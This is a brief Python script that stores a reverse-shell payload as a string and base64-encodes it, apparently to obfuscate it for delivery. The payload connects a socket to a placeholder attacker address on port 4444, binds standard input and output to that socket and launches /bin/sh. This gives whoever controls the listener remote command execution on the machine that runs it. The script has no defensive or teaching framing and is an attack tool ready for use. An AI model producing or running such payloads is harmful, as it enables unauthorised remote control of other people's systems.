import base64

code = """
import socket, subprocess, os
s = socket.socket()
s.connect(("Your ip address", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh"])
"""

encoded = base64.b64encode(code.encode('utf-8')).decode('utf-8')
print(encoded)

